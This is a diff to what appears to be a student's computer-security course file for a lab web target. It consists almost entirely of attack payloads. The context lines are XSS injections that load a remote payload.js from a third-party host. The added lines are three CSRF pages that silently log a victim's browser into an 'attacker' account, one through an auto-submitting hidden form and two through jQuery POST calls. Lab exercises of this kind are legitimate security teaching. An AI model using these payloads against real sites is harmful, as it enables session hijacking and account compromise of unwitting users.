@@ -31,3 +31,50 @@
 <IMG SRC=https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js></img>
 
 <SCRIPT SRC="https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js"></SCRIPT>
+
+<html>
+    <body>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script>
+            $(function() {
+                console.log("sending...");
+                $.post("https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4&", { username: "attacker", password: "l33th4x" });
+            });
+        </script>
+    </body>
+</html>
+
+<html>
+    <body>
+        <form id="data" action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="POST">
+            <input type="hidden" name="username" value="attacker" />
+            <input type="hidden" name="password" value="l33th4x" />
+        </form>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script>
+            $(function() {
+                console.log("sending...");
+                $.ajax({
+                    type: "post",
+                    url: "https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4", 
+                    data: $('#data').serialize(),
+                    success: function (data) {
+                        console.log(data);
+                    }, 
+                    dataType: "script"});
+            });
+        </script>
+    </body>
+</html>
+
+<html>
+    <body>
+        <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="POST">
+            <input type="hidden" name="username" value="attacker" />
+            <input type="hidden" name="password" value="l33th4x" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
